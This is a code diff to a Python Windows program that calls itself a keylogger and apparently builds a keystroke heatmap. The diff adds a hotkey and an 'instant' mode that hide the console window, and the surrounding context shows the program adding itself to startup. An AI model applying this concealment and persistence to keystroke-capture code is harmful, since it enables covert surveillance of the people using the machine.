@@ -4,6 +4,7 @@ import win32api
 import win32event
 import win32console
 import win32gui
+import win32con
 import winerror
 import json
 import os
@@ -34,6 +35,8 @@ heatmap_order = []
 paused = False
 # Time when the last save of the heatmap was
 last_save = 0
+# State of visibility
+visible = True
 
 # Read config from json file
 def read_config():
@@ -277,12 +280,26 @@ def read_heatmap():
     return False    
 
 def hide():
-    # Hide Console
-    window = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(window, 0)
-    return True
+    global visible
+    if config["hide"] == "never":
+        print("Change visibillity is with this config not allowed!")
+    elif visible: 
+        # Hide Console
+        window = win32console.GetConsoleWindow()
+        win32gui.ShowWindow(window, win32con.SW_HIDE)
+        visible = False
+        return True
+    elif not config["hide"] == "allways":
+        # Unhide Console
+        window = win32console.GetConsoleWindow()
+        win32gui.ShowWindow(window, win32con.SW_NORMAL)
+        visible = True
+        return True
+    return False
+
 
 def main():
+    global visible
     if not config["hide"] == "allways":
         print(LOGGER_NAME + " started")
     # Hide comand prompt
@@ -294,6 +311,8 @@ def main():
     keyboard.add_hotkey(config["hotkeys"]["pause-hotkey"], pause_logging)
     # To save the buffer (ctrl + alt + s)
     keyboard.add_hotkey(config["hotkeys"]["save-hotkey"], log_local)
+    # To toggle visibillity of window (ctrl + alt + v)
+    keyboard.add_hotkey(config["hotkeys"]["visible-hotkey"], hide)
     # To Exit the Keylogger with safing the buffer (ctrl + alt + e)
     keyboard.wait(config["hotkeys"]["exit-hotkey"]) 
     if config["output"] == "local":
@@ -305,7 +324,7 @@ def main():
 
 if __name__ == '__main__':
     # Hide comand prompt
-    if config["hide"] == "allways":
+    if config["hide"] == "allways" or config["hide"] == "instant":
         hide()
 
     # Add to startup
